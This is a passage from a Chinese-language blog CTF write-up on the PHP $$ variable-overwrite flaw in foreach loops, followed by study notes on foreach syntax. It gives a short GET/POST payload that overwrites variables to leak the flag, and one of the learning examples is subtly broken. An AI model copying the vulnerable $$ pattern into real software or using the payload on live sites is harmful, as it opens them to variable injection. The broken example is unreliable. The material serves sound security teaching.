class="comment">//这里将只是将数组键当做下一个变量，将数组的值当做这个$$key的值。例如post方法传入flag=asd，则处理后变成$flag=asd。这样就造成将我们需要获取的flag的值给覆盖掉了</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>] !== <span class="variable">$flag</span> )<span class="comment">//判断post的flag参数值是否为原本定义的$flag的值，虽然不知道原本的$flag变量值，但是我们可先将$flag的值通过第一个数组遍历赋值给$_200,之后再随便赋给$flag一个值后通过die($_200)输出出来$flag的值，所以$flag原本的值即使被覆盖也无所谓，因为我们早已将$flag的值赋给$_200了，而最后输出的$_200也必然是两个flag变量值，一个为真正的flag一个为随便输入的</span></span><br><span class="line">      <span class="keyword">die</span>(<span class="variable">$_403</span>);<span class="comment">//输出$_403</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is your flag : &quot;</span>. <span class="variable">$flag</span> . <span class="string">&quot;\n&quot;</span>;<span class="comment">//输出$flag的值</span></span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$_200</span>);<span class="comment">//输出$_200</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：</p><p><u>Get方法传输</u>：<code>?_200=flag</code><br><u>Post方法传输</u>：<code>flag=asd</code></p><h3 id="二-学习笔记-2"><a href="#二-学习笔记-2" class="headerlink" title="二.学习笔记"></a>二.学习笔记</h3><h4 id="1-变量覆盖"><a href="#1-变量覆盖" class="headerlink" title="1.$$变量覆盖"></a>1.$$变量覆盖</h4><p><strong>$$</strong> 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的值作为变量的值。因此就产生了变量覆盖漏洞。</p><h4 id="2-PHP-foreach-遍历数组"><a href="#2-PHP-foreach-遍历数组" class="headerlink" title="2.PHP foreach 遍历数组"></a>2.PHP foreach 遍历数组</h4><p>foreach 语句用于循环遍历数组。<br>每进行一次循环，当前数组元素的值就会被赋值给 value 变量(数组指针会逐一地移动) - 以此类推。<br><strong>它的语法是：</strong><br><code>foreach (array as value)</code> 或者<code>foreach (array as $key =&gt; $value)</code>【任选其一】<code>&#123;</code></p><p><code>code to be executed;</code>//要执行的代码</p><p><code>&#125;</code> 注：当试图将其用于其它数据类型或者一个未初始化的变量时会产生错误。</p><p>上述语法中，每次循环将当前单元的值赋给 $value 并且数组内部的指针向前移一步。在第二种语法格式中还将当前单元的键名也会在每次循环中赋给变量 $key。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr_day</span> = <span class="keyword">array</span>(<span class="string">&quot;Friday&quot;</span>=&gt;<span class="number">18</span>, <span class="string">&quot;Saterday&quot;</span>=&gt;<span class="number">19</span>, <span class="string">&quot;Sunday&quot;</span>=&gt;<span class="number">20</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr_day</span> <span class="keyword">as</span> <span class="variable">$day</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$day</span>,<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="number">18</span></span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure><p><strong>使用数组键值：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr_Troy3e</span> = <span class="keyword">array</span>(<span class="string">&quot;T&quot;</span>=&gt;da, <span class="string">&quot;r&quot;</span>=&gt;lao, <span class="string">&quot;o&quot;</span>=&gt;qing， <span class="string">&quot;y&quot;</span>=&gt;dai，<span class="string">&quot;3&quot;</span>=&gt;dai，<span class="string">&quot;e&quot;</span>=&gt;wo);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr_Troy3e</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$TS</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>,<span class="string">&#x27;: &#x27;</span>,<span class="variable">$haha</span>,<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输出</span></span><br><span class="line">T: da</span><br><span class="line">r: lao    </span><br><span class="line">o: qing</span><br><span class="line">y: dai    </span><br><span class="line"><span class="number">3</span>: dai   </span><br><span class="line">e: wo   </span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></article></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">Table of Contents</li><li class="sidebar-nav-overview">Overview</li></ul><div class="post-toc-wrap sidebar-panel"></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><p class="site-author-name" itemprop="name">John Doe</p><div class="site-description" itemprop="description"></div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">4</span> <span class="site-state-item-name">posts</span></a></div><div class="site-state-item site-state-categories"><span class="site-state-item-count">1</span> <span class="site-state-item-name">categories</span></div><div class="site-state-item site-state-tags"><span class="site-state-item-count">1</span> <span class="site-state-item-name">tags</span></div></nav></div></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">John Doe</span></div><div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a></div></div></footer></div><script src="/lib/anime.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script></body></html>